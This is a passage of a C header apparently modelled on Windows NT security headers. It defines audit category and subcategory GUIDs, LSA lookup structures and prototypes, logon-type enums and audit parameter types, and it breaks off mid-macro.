    #define Audit_ObjectAccess_CertificationServices_defined
    #endif
#endif

/* 0cce9222-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_ApplicationGenerated_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_ApplicationGenerated,
        0x0cce9222,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_ApplicationGenerated_defined
    #endif
#endif

/*
The Audit_ObjectAccess_Handle sub-category behaves different from the other sub-categories.
For handle based audits to be generated (Open handle AuditId: 0x1230, Close handle AuditId:
0x1232), the corresponding object sub-category AND Audit_ObjectAccess_Handle must be
enabled. For eg, to generate handle based audits for Reg keys, both
Audit_ObjectAccess_Registry and Audit_ObjectAccess_Handle must be enabled
*/

/* 0cce9223-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_Handle_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_Handle,
        0x0cce9223,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_Handle_defined
    #endif
#endif

/* 0cce9224-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_Share_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_Share,
        0x0cce9224,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_Share_defined
    #endif
#endif

/* 0cce9225-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_FirewallPacketDrops_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_FirewallPacketDrops,
        0x0cce9225,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_FirewallPacketDrops_defined
    #endif
#endif

/* 0cce9226-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_FirewallConnection_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_FirewallConnection,
        0x0cce9226,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_FirewallConnection_defined
    #endif
#endif

/* 0cce9227-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_Other_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_Other,
        0x0cce9227,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_Other_defined
    #endif
#endif

/* 0cce9228-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PrivilegeUse_Sensitive_defined)
    DEFINE_GUID(
        Audit_PrivilegeUse_Sensitive,
        0x0cce9228,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PrivilegeUse_Sensitive_defined
    #endif
#endif

/* 0cce9229-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PrivilegeUse_NonSensitive_defined)
    DEFINE_GUID(
        Audit_PrivilegeUse_NonSensitive,
        0x0cce9229,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PrivilegeUse_NonSensitive_defined
    #endif
#endif

/* 0cce922a-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PrivilegeUse_Others_defined)
    DEFINE_GUID(
        Audit_PrivilegeUse_Others,
        0x0cce922a,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PrivilegeUse_Others_defined
    #endif
#endif

/* 0cce922b-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_DetailedTracking_ProcessCreation_defined)
    DEFINE_GUID(
        Audit_DetailedTracking_ProcessCreation,
        0x0cce922b,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_DetailedTracking_ProcessCreation_defined
    #endif
#endif

/* 0cce922c-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_DetailedTracking_ProcessTermination_defined)
    DEFINE_GUID(
        Audit_DetailedTracking_ProcessTermination,
        0x0cce922c,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_DetailedTracking_ProcessTermination_defined
    #endif
#endif

/* 0cce922d-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_DetailedTracking_DpapiActivity_defined)
    DEFINE_GUID(
        Audit_DetailedTracking_DpapiActivity,
        0x0cce922d,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_DetailedTracking_DpapiActivity_defined
    #endif
#endif

/* 0cce922e-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_DetailedTracking_RpcCall_defined)
    DEFINE_GUID(
        Audit_DetailedTracking_RpcCall,
        0x0cce922e,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_DetailedTracking_RpcCall_defined
    #endif
#endif

/* 0cce922f-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PolicyChange_AuditPolicy_defined)
    DEFINE_GUID(
        Audit_PolicyChange_AuditPolicy,
        0x0cce922f,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PolicyChange_AuditPolicy_defined
    #endif
#endif

/* 0cce9230-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PolicyChange_AuthenticationPolicy_defined)
    DEFINE_GUID(
        Audit_PolicyChange_AuthenticationPolicy,
        0x0cce9230,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PolicyChange_AuthenticationPolicy_defined
    #endif
#endif

/* 0cce9231-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PolicyChange_AuthorizationPolicy_defined)
    DEFINE_GUID(
        Audit_PolicyChange_AuthorizationPolicy,
        0x0cce9231,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PolicyChange_AuthorizationPolicy_defined
    #endif
#endif

/* 0cce9232-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PolicyChange_MpsscvRulePolicy_defined)
    DEFINE_GUID(
        Audit_PolicyChange_MpsscvRulePolicy,
        0x0cce9232,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PolicyChange_MpsscvRulePolicy_defined
    #endif
#endif

/* 0cce9233-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PolicyChange_WfpIPSecPolicy_defined)
    DEFINE_GUID(
        Audit_PolicyChange_WfpIPSecPolicy,
        0x0cce9233,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PolicyChange_WfpIPSecPolicy_defined
    #endif
#endif

/* 0cce9234-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PolicyChange_Others_defined)
    DEFINE_GUID(
        Audit_PolicyChange_Others,
        0x0cce9234,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PolicyChange_Others_defined
    #endif
#endif

/* 0cce9235-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountManagement_UserAccount_defined)
    DEFINE_GUID(
        Audit_AccountManagement_UserAccount,
        0x0cce9235,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountManagement_UserAccount_defined
    #endif
#endif

/* 0cce9236-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountManagement_ComputerAccount_defined)
    DEFINE_GUID(
        Audit_AccountManagement_ComputerAccount,
        0x0cce9236,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountManagement_ComputerAccount_defined
    #endif
#endif

/* 0cce9237-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountManagement_SecurityGroup_defined)
    DEFINE_GUID(
        Audit_AccountManagement_SecurityGroup,
        0x0cce9237,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountManagement_SecurityGroup_defined
    #endif
#endif

/* 0cce9238-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountManagement_DistributionGroup_defined)
    DEFINE_GUID(
        Audit_AccountManagement_DistributionGroup,
        0x0cce9238,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountManagement_DistributionGroup_defined
    #endif
#endif

/* 0cce9239-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountManagement_ApplicationGroup_defined)
    DEFINE_GUID(
        Audit_AccountManagement_ApplicationGroup,
        0x0cce9239,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountManagement_ApplicationGroup_defined
    #endif
#endif

/* 0cce923a-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountManagement_Others_defined)
    DEFINE_GUID(
        Audit_AccountManagement_Others,
        0x0cce923a,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountManagement_Others_defined
    #endif
#endif

/* 0cce923b-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_DSAccess_DSAccess_defined)
    DEFINE_GUID(
        Audit_DSAccess_DSAccess,
        0x0cce923b,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_DSAccess_DSAccess_defined
    #endif
#endif

/* 0cce923c-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_DsAccess_AdAuditChanges_defined)
    DEFINE_GUID(
        Audit_DsAccess_AdAuditChanges,
        0x0cce923c,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_DsAccess_AdAuditChanges_defined
    #endif
#endif

/* 0cce923d-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Ds_Replication_defined)
    DEFINE_GUID(
        Audit_Ds_Replication,
        0x0cce923d,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Ds_Replication_defined
    #endif
#endif

/* 0cce923e-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Ds_DetailedReplication_defined)
    DEFINE_GUID(
        Audit_Ds_DetailedReplication,
        0x0cce923e,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Ds_DetailedReplication_defined
    #endif
#endif

/* 0cce923f-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountLogon_CredentialValidation_defined)
    DEFINE_GUID(
        Audit_AccountLogon_CredentialValidation,
        0x0cce923f,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountLogon_CredentialValidation_defined
    #endif
#endif

/* 0cce9240-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountLogon_Kerberos_defined)
    DEFINE_GUID(
        Audit_AccountLogon_Kerberos,
        0x0cce9240,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountLogon_Kerberos_defined
    #endif
#endif

/* 0cce9241-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountLogon_Others_defined)
    DEFINE_GUID(
        Audit_AccountLogon_Others,
        0x0cce9241,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountLogon_Others_defined
    #endif
#endif

/* 0cce9242-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountLogon_KerbCredentialValidation_defined)
    DEFINE_GUID(
        Audit_AccountLogon_KerbCredentialValidation,
        0x0cce9242,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountLogon_KerbCredentialValidation_defined
    #endif
#endif

/* 0cce9243-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_NPS_defined)
    DEFINE_GUID(
        Audit_Logon_NPS,
        0x0cce9243,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_NPS_defined
    #endif
#endif

/* 0cce9244-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_DetailedFileShare_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_DetailedFileShare,
        0x0cce9244,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_DetailedFileShare_defined
    #endif
#endif

#endif // DEFINE_GUID


//
// All categories are named as <Audit_CategoryName>
//

#ifdef DEFINE_GUID

/* 69979848-797a-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_System_defined)
    DEFINE_GUID(
        Audit_System,
        0x69979848,
        0x797a, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_System_defined
    #endif
#endif

/* 69979849-797a-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_defined)
    DEFINE_GUID(
        Audit_Logon,
        0x69979849,
        0x797a, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_defined
    #endif
#endif

/* 6997984a-797a-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_defined)
    DEFINE_GUID(
        Audit_ObjectAccess,
        0x6997984a,
        0x797a, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_defined
    #endif
#endif

/* 6997984b-797a-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PrivilegeUse_defined)
    DEFINE_GUID(
        Audit_PrivilegeUse,
        0x6997984b,
        0x797a, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PrivilegeUse_defined
    #endif
#endif

/* 6997984c-797a-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_DetailedTracking_defined)
    DEFINE_GUID(
        Audit_DetailedTracking,
        0x6997984c,
        0x797a, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_DetailedTracking_defined
    #endif
#endif

/* 6997984d-797a-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PolicyChange_defined)
    DEFINE_GUID(
        Audit_PolicyChange,
        0x6997984d,
        0x797a, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PolicyChange_defined
    #endif
#endif

/* 6997984e-797a-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountManagement_defined)
    DEFINE_GUID(
        Audit_AccountManagement,
        0x6997984e,
        0x797a, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountManagement_defined
    #endif
#endif

/* 6997984f-797a-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_DirectoryServiceAccess_defined)
    DEFINE_GUID(
        Audit_DirectoryServiceAccess,
        0x6997984f,
        0x797a, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_DirectoryServiceAccess_defined
    #endif
#endif

/* 69979850-797a-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountLogon_defined)
    DEFINE_GUID(
        Audit_AccountLogon,
        0x69979850,
        0x797a, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountLogon_defined
    #endif
#endif

#endif // DEFINE_GUID

// 04.06.2011 - added
#if !defined(_NTLSA_IFS_)
#define _NTLSA_IFS_

#if !defined(_LSALOOKUP_)
#define _LSALOOKUP_

#if defined(_NTDEF_)

typedef UNICODE_STRING LSA_UNICODE_STRING, *PLSA_UNICODE_STRING;
typedef STRING LSA_STRING, *PLSA_STRING;
typedef OBJECT_ATTRIBUTES LSA_OBJECT_ATTRIBUTES, *PLSA_OBJECT_ATTRIBUTES;

#else // _NTDEF_

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
#ifdef MIDL_PASS
	[size_is(MaximumLength/2), length_is(Length/2)]
#endif // MIDL_PASS
	PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING;

typedef struct _LSA_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PCHAR Buffer;
} LSA_STRING, *PLSA_STRING;

typedef struct _LSA_OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PLSA_UNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR
	PVOID SecurityQualityOfService;  // Points to type SECURITY_QUALITY_OF_SERVICE
} LSA_OBJECT_ATTRIBUTES, *PLSA_OBJECT_ATTRIBUTES;

#endif // _NTDEF_

typedef struct _LSA_TRUST_INFORMATION {
	LSA_UNICODE_STRING Name;	// The name of the domain
	PSID Sid;									// ptr to domain Sid
} LSA_TRUST_INFORMATION, *PLSA_TRUST_INFORMATION;

typedef struct _LSA_REFERENCED_DOMAIN_LIST {
	ULONG Entries;									// count of domains in domain array
	PLSA_TRUST_INFORMATION Domains;	// pointer to array LSA_TRUST_INFORMATION data
} LSA_REFERENCED_DOMAIN_LIST, *PLSA_REFERENCED_DOMAIN_LIST;

#if (_WIN32_WINNT >= 0x0501)
typedef struct _LSA_TRANSLATED_SID2 {
	SID_NAME_USE Use;
	PSID         Sid;
	LONG         DomainIndex;
	ULONG        Flags;
} LSA_TRANSLATED_SID2, *PLSA_TRANSLATED_SID2;
#endif

typedef struct _LSA_TRANSLATED_NAME {
	SID_NAME_USE Use;
	LSA_UNICODE_STRING Name;
	LONG DomainIndex;
} LSA_TRANSLATED_NAME, *PLSA_TRANSLATED_NAME;

typedef struct _POLICY_ACCOUNT_DOMAIN_INFO {
	LSA_UNICODE_STRING DomainName;
	PSID DomainSid;
} POLICY_ACCOUNT_DOMAIN_INFO, *PPOLICY_ACCOUNT_DOMAIN_INFO;

typedef struct _POLICY_DNS_DOMAIN_INFO
{
	LSA_UNICODE_STRING Name;
	LSA_UNICODE_STRING DnsDomainName;
	LSA_UNICODE_STRING DnsForestName;
	GUID DomainGuid;
	PSID Sid;
} POLICY_DNS_DOMAIN_INFO, *PPOLICY_DNS_DOMAIN_INFO;

#define LOOKUP_VIEW_LOCAL_INFORMATION       0x00000001
#define LOOKUP_TRANSLATE_NAMES              0x00000800

typedef enum _LSA_LOOKUP_DOMAIN_INFO_CLASS {
	AccountDomainInformation = 5,
	DnsDomainInformation     = 12
} LSA_LOOKUP_DOMAIN_INFO_CLASS, *PLSA_LOOKUP_DOMAIN_INFO_CLASS;

typedef PVOID LSA_LOOKUP_HANDLE, *PLSA_LOOKUP_HANDLE;

NTSTATUS
LsaLookupOpenLocalPolicy(
	IN PLSA_OBJECT_ATTRIBUTES ObjectAttributes,
	IN ACCESS_MASK AccessMask,
	IN OUT PLSA_LOOKUP_HANDLE PolicyHandle
	);

NTSTATUS
LsaLookupClose(
	IN LSA_LOOKUP_HANDLE ObjectHandle
	);

NTSTATUS
LsaLookupTranslateSids(
	IN LSA_LOOKUP_HANDLE PolicyHandle,
	IN ULONG Count,
	IN PSID *Sids,
	OUT PLSA_REFERENCED_DOMAIN_LIST *ReferencedDomains,
	OUT PLSA_TRANSLATED_NAME *Names
	);

#if (_WIN32_WINNT >= 0x0501)
NTSTATUS
LsaLookupTranslateNames(
	IN LSA_LOOKUP_HANDLE PolicyHandle,
	IN ULONG Flags,
	IN ULONG Count,
	IN PLSA_UNICODE_STRING Names,
	OUT PLSA_REFERENCED_DOMAIN_LIST *ReferencedDomains,
	OUT PLSA_TRANSLATED_SID2 *Sids
	);
#endif

NTSTATUS
LsaLookupGetDomainInfo(
	IN LSA_LOOKUP_HANDLE PolicyHandle,
	IN LSA_LOOKUP_DOMAIN_INFO_CLASS DomainInfoClass,
	OUT PVOID *DomainInfo
	);

NTSTATUS
LsaLookupFreeMemory(
	IN PVOID Buffer
	);

#endif // _LSALOOKUP_

#define LSA_MODE_PASSWORD_PROTECTED     (0x00000001L)
#define LSA_MODE_INDIVIDUAL_ACCOUNTS    (0x00000002L)
#define LSA_MODE_MANDATORY_ACCESS       (0x00000004L)
#define LSA_MODE_LOG_FULL               (0x00000008L)

typedef enum _SECURITY_LOGON_TYPE {
    UndefinedLogonType = 0, // This is used to specify an undefied logon type
    Interactive = 2,      // Interactively logged on (locally or remotely)
    Network,              // Accessing system via network
    Batch,                // Started via a batch queue
    Service,              // Service started by service controller
    Proxy,                // Proxy logon
    Unlock,               // Unlock workstation
    NetworkCleartext,     // Network logon with cleartext credentials
    NewCredentials,       // Clone caller, new default credentials
    //The types below only exist in Windows XP and greater
#if (_WIN32_WINNT >= 0x0501)
    RemoteInteractive,  // Remote, yet interactive. Terminal server
    CachedInteractive,  // Try cached credentials without hitting the net.
    // The types below only exist in Windows Server 2003 and greater
#endif
#if (_WIN32_WINNT >= 0x0502)
    CachedRemoteInteractive, // Same as RemoteInteractive, this is used internally for auditing purpose
    CachedUnlock        // Cached Unlock workstation
#endif
} SECURITY_LOGON_TYPE, *PSECURITY_LOGON_TYPE;

typedef ULONG LSA_OPERATIONAL_MODE, *PLSA_OPERATIONAL_MODE;

#if !defined(_NTLSA_AUDIT_)
#define _NTLSA_AUDIT_

//
// The following enumerated type is used between the reference monitor and
// LSA in the generation of audit messages.  It is used to indicate the
// type of data being passed as a parameter from the reference monitor
// to LSA.  LSA is responsible for transforming the specified data type
// into a set of unicode strings that are added to the event record in
// the audit log.
//

typedef enum _SE_ADT_PARAMETER_TYPE {

    SeAdtParmTypeNone = 0,          //Produces 1 parameter
    SeAdtParmTypeString,            //Produces 1 parameter.
    SeAdtParmTypeFileSpec,
		SeAdtParmTypeUlong,             //Produces 1 parameter
    SeAdtParmTypeSid,               //Produces 1 parameter.
    SeAdtParmTypeLogonId,           //Produces 4 parameters.
    SeAdtParmTypeNoLogonId,         //Produces 3 parameters.
    SeAdtParmTypeAccessMask,        //Produces 1 parameter with formatting.
    SeAdtParmTypePrivs,             //Produces 1 parameter with formatting.
    SeAdtParmTypeObjectTypes,       //Produces 10 parameters with formatting.
    SeAdtParmTypeHexUlong,          //Produces 1 parameter
    SeAdtParmTypePtr,               //Produces 1 parameter
    SeAdtParmTypeTime,              //Produces 2 parameters
    SeAdtParmTypeGuid,              //Produces 1 parameter
    SeAdtParmTypeLuid,              //
    SeAdtParmTypeHexInt64,          //Produces 1 parameter
    SeAdtParmTypeStringList,        //Produces 1 parameter
    SeAdtParmTypeSidList,           //Produces 1 parameter
    SeAdtParmTypeDuration,          //Produces 1 parameters
    SeAdtParmTypeUserAccountControl,//Produces 3 parameters
    SeAdtParmTypeNoUac,             //Produces 3 parameters
    SeAdtParmTypeMessage,           //Produces 1 Parameter
    SeAdtParmTypeDateTime,          //Produces 1 Parameter
    SeAdtParmTypeSockAddr,          // Produces 2 parameters
    SeAdtParmTypeSD,                // Produces 1 parameters
    SeAdtParmTypeLogonHours,        // Produces 1 parameters
    SeAdtParmTypeLogonIdNoSid,      //Produces 3 parameters.
    SeAdtParmTypeUlongNoConv,       // Produces 1 parameter.
    SeAdtParmTypeSockAddrNoPort,     // Produces 1 parameter
    SeAdtParmTypeAccessReason

} SE_ADT_PARAMETER_TYPE, *PSE_ADT_PARAMETER_TYPE;

#if !defined(GUID_DEFINED)
#include <guiddef.h>
#endif /* GUID_DEFINED */

typedef struct _SE_ADT_OBJECT_TYPE {
    GUID ObjectType;
    USHORT Flags;
#define SE_ADT_OBJECT_ONLY 0x1
    USHORT Level;
    ACCESS_MASK AccessMask;
} SE_ADT_OBJECT_TYPE, *PSE_ADT_OBJECT_TYPE;

typedef struct _SE_ADT_PARAMETER_ARRAY_ENTRY {

    SE_ADT_PARAMETER_TYPE Type;
    ULONG Length;
    ULONG_PTR Data[2];
    PVOID Address;
} SE_ADT_PARAMETER_ARRAY_ENTRY, *PSE_ADT_PARAMETER_ARRAY_ENTRY;


typedef struct _SE_ADT_ACCESS_REASON{
    ACCESS_MASK AccessMask;
    ULONG  AccessReasons[32];
    ULONG  ObjectTypeIndex;
    ULONG AccessGranted;
    PSECURITY_DESCRIPTOR SecurityDescriptor;
} SE_ADT_ACCESS_REASON, *PSE_ADT_ACCESS_REASON;

#define SE_MAX_AUDIT_PARAMETERS 32
#define SE_MAX_GENERIC_AUDIT_PARAMETERS 28

typedef struct _SE_ADT_PARAMETER_ARRAY {

    ULONG CategoryId;
    ULONG AuditId;
    ULONG ParameterCount;
    ULONG Length;
    USHORT FlatSubCategoryId;
    USHORT Type;
    ULONG Flags;
    SE_ADT_PARAMETER_ARRAY_ENTRY Parameters[ SE_MAX_AUDIT_PARAMETERS ];

} SE_ADT_PARAMETER_ARRAY, *PSE_ADT_PARAMETER_ARRAY;

#define SE_ADT_PARAMETERS_SELF_RELATIVE     0x00000001
#define SE_ADT_PARAMETERS_SEND_TO_LSA       0x00000002
#define SE_ADT_PARAMETER_EXTENSIBLE_AUDIT   0x00000004
#define SE_ADT_PARAMETER_GENERIC_AUDIT      0x00000008
#define SE_ADT_PARAMETER_WRITE_SYNCHRONOUS  0x00000010

#define LSAP_SE_ADT_PARAMETER_ARRAY_TRUE_SIZE(AuditParameters)    \
     ( sizeof(SE_ADT_PARAMETER_ARRAY) -                           \
       sizeof(SE_ADT_PARAMETER_ARRAY_ENTRY) *                     \
       (SE_MAX_AUDIT_PARAMETERS - AuditParameters->ParameterCount) )

#endif // !defined(_NTLSA_AUDIT_)

typedef enum _POLICY_AUDIT_EVENT_TYPE {

    AuditCategorySystem = 0,
    AuditCategoryLogon,
    AuditCategoryObjectAccess,
    AuditCategoryPrivilegeUse,
    AuditCategoryDetailedTracking,
    AuditCategoryPolicyChange,
    AuditCategoryAccountManagement,
    AuditCategoryDirectoryServiceAccess,
    AuditCategoryAccountLogon

} POLICY_AUDIT_EVENT_TYPE, *PPOLICY_AUDIT_EVENT_TYPE;

#define POLICY_AUDIT_EVENT_UNCHANGED       (0x00000000L)
#define POLICY_AUDIT_EVENT_SUCCESS         (0x00000001L)
#define POLICY_AUDIT_EVENT_FAILURE         (0x00000002L)
#define POLICY_AUDIT_EVENT_NONE            (0x00000004L)

#define POLICY_AUDIT_EVENT_MASK \
    (POLICY_AUDIT_EVENT_SUCCESS | \
     POLICY_AUDIT_EVENT_FAILURE | \
